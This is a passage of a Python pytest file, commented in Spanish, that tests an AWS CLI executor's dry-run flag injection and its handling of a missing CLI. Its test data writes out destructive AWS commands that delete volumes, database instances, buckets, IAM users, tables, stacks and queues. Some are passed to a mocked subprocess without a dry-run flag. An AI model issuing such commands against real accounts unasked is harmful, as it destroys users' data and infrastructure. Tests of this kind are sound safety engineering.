        "aws ec2 delete-volume --volume-id vol-12345",
        "aws ec2 delete-volume --volume-id vol-12345 --dry-run",
    ),
    (
        "aws rds delete-db-instance --db-instance-identifier mydb",
        "aws rds delete-db-instance --db-instance-identifier mydb --dry-run",
    ),
    (
        "aws s3api delete-bucket --bucket my-bucket",
        "aws s3api delete-bucket --bucket my-bucket --dry-run",
    ),
    (
        "aws iam delete-user --user-name testuser",
        "aws iam delete-user --user-name testuser --dry-run",
    ),
]

# Comandos que NO deben recibir --dry-run (servicios no soportados)
DRY_RUN_UNSUPPORTED_CASES: list[str] = [
    "aws s3 ls",
    "aws lambda invoke --function-name myFunc output.json",
    "aws dynamodb delete-table --table-name mytable",
    "aws cloudformation delete-stack --stack-name mystack",
    "aws sns publish --topic-arn arn:aws:sns:us-east-1:123:topic --message hello",
    "aws sqs delete-queue --queue-url https://sqs.us-east-1.amazonaws.com/123/myqueue",
]


class TestDryRunInjection:
    """Tests parametrizados para la inyección de --dry-run en AWSExecutor."""

    # -------------------------------------------------------------------
    # Servicios soportados: DEBEN recibir --dry-run
    # -------------------------------------------------------------------

    @pytest.mark.parametrize(
        ("command", "expected"),
        DRY_RUN_SUPPORTED_CASES,
        ids=[
            "ec2_run_instances",
            "ec2_terminate_instances",
            "ec2_delete_volume",
            "rds_delete_db_instance",
            "s3api_delete_bucket",
            "iam_delete_user",
        ],
    )
    def test_inject_dry_run_supported_services(self, command: str, expected: str) -> None:
        """Verifica que _inject_dry_run agrega --dry-run a comandos soportados."""
        executor = AWSExecutor(dry_run=True)
        result = executor._inject_dry_run(command)
        assert result == expected

    # -------------------------------------------------------------------
    # Servicios NO soportados: NO deben recibir --dry-run
    # -------------------------------------------------------------------

    @pytest.mark.parametrize(
        "command",
        DRY_RUN_UNSUPPORTED_CASES,
        ids=[
            "s3_ls",
            "lambda_invoke",
            "dynamodb_delete_table",
            "cloudformation_delete_stack",
            "sns_publish",
            "sqs_delete_queue",
        ],
    )
    def test_inject_dry_run_unsupported_services(self, command: str) -> None:
        """Verifica que _inject_dry_run NO modifica comandos no soportados."""
        executor = AWSExecutor(dry_run=True)
        result = executor._inject_dry_run(command)
        assert result == command

    # -------------------------------------------------------------------
    # Flujo completo run() con dry_run=True — servicio soportado
    # -------------------------------------------------------------------

    def test_run_dry_run_supported_command_injects_flag(self) -> None:
        """Verifica que run() inyecta --dry-run en subprocess para comandos soportados."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(dry_run=True)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="DryRun: true",
                stderr="",
                returncode=0,
            )
            result = executor.run(
                "aws ec2 run-instances --instance-type t3.micro --image-id ami-12345"
            )

        # El comando pasado a subprocess debe incluir --dry-run
        call_args = mock_run.call_args[0][0]
        assert "--dry-run" in call_args
        # El resultado debe indicar dry_run=True
        assert result.dry_run is True

    # -------------------------------------------------------------------
    # Flujo completo run() con dry_run=True — servicio NO soportado
    # -------------------------------------------------------------------

    def test_run_dry_run_unsupported_command_no_flag(self) -> None:
        """Verifica que run() NO inyecta --dry-run para comandos no soportados."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor(dry_run=True)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout='{"Buckets": []}',
                stderr="",
                returncode=0,
            )
            result = executor.run("aws s3 ls")

        # El comando pasado a subprocess NO debe incluir --dry-run
        call_args = mock_run.call_args[0][0]
        assert "--dry-run" not in call_args
        # El resultado aún tiene dry_run=True porque el executor está en modo dry-run
        assert result.dry_run is True

    # -------------------------------------------------------------------
    # dry_run=False (default) — NO debe inyectar --dry-run
    # -------------------------------------------------------------------

    def test_run_default_no_dry_run_injection(self) -> None:
        """Verifica que con dry_run=False el executor NO inyecta --dry-run."""
        from unittest.mock import MagicMock, patch

        executor = AWSExecutor()  # dry_run=False por defecto
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="instance launched",
                stderr="",
                returncode=0,
            )
            result = executor.run(
                "aws ec2 run-instances --instance-type t3.micro --image-id ami-12345"
            )

        # El comando pasado a subprocess NO debe incluir --dry-run
        call_args = mock_run.call_args[0][0]
        assert "--dry-run" not in call_args
        # El resultado debe indicar dry_run=False
        assert result.dry_run is False


# ---------------------------------------------------------------------------
# Tests dedicados — AWS CLI not found (FileNotFoundError)
# ---------------------------------------------------------------------------


class TestAwsCliNotFound:
    """Tests dedicados para el manejo de FileNotFoundError (AWS CLI no instalado).

    Cuando subprocess.run lanza FileNotFoundError, el executor debe retornar
    un ExecutionResult con exit_code=127, mensaje claro con URL de instalación,
    error='aws_cli_missing', stdout vacío y duration_ms=0.
    """

    def test_file_not_found_returns_exit_code_127(self, executor: AWSExecutor) -> None:
        """FileNotFoundError debe retornar exit_code=127."""
        from unittest.mock import patch

        with patch("subprocess.run", side_effect=FileNotFoundError("aws")):
            result = executor.run("aws s3 ls")

        assert result.exit_code == 127

    def test_file_not_found_has_clear_error_message(self, executor: AWSExecutor) -> None:
        """El stderr debe contener un mensaje claro con la URL de instalación."""
        from unittest.mock import patch

        with patch("subprocess.run", side_effect=FileNotFoundError("aws")):
            result = executor.run("aws s3 ls")

        assert "AWS CLI not found" in result.stderr
        assert "https://aws.amazon.com/cli/" in result.stderr

    def test_file_not_found_error_field_is_aws_cli_missing(self, executor: AWSExecutor) -> None:
        """El campo error debe ser 'aws_cli_missing'."""
        from unittest.mock import patch

        with patch("subprocess.run", side_effect=FileNotFoundError("aws")):
            result = executor.run("aws s3 ls")

        assert result.error == "aws_cli_missing"

    def test_file_not_found_stdout_is_empty(self, executor: AWSExecutor) -> None:
        """El stdout debe estar vacío cuando AWS CLI no se encuentra."""
        from unittest.mock import patch

        with patch("subprocess.run", side_effect=FileNotFoundError("aws")):
            result = executor.run("aws s3 ls")

        assert result.stdout == ""

    def test_file_not_found_duration_ms_is_zero(self, executor: AWSExecutor) -> None:
        """El duration_ms debe ser 0 ya que el comando nunca se ejecutó."""
        from unittest.mock import patch

        with patch("subprocess.run", side_effect=FileNotFoundError("aws")):
            result = executor.run("aws s3 ls")

        assert result.duration_ms == 0

    def test_file_not_found_preserves_command(self, executor: AWSExecutor) -> None:
        """El resultado debe preservar el comando original intentado."""
        from unittest.mock import patch

        with patch("subprocess.run", side_effect=FileNotFoundError("aws")):
            result = executor.run("aws ec2 describe-instances --region us-west-2")

        assert result.command == "aws ec2 describe-instances --region us-west-2"

    def test_file_not_found_not_retried(self) -> None:
        """FileNotFoundError no debe reintentarse incluso con max_retries=3."""
        from unittest.mock import patch

        executor = AWSExecutor(max_retries=3)

        with (
            patch("subprocess.run", side_effect=FileNotFoundError("aws")) as mock_run,
            patch("time.sleep") as mock_sleep,
        ):
            result = executor.run("aws s3 ls")

        assert mock_run.call_count == 1
        assert mock_sleep.call_count == 0
        assert result.exit_code == 127

    def test_file_not_found_dry_run_false_by_default(self, executor: AWSExecutor) -> None:
        """El campo dry_run debe ser False por defecto en resultado de FileNotFoundError."""
        from unittest.mock import patch

        with patch("subprocess.run", side_effect=FileNotFoundError("aws")):
            result = executor.run("aws s3 ls")

        assert result.dry_run is False
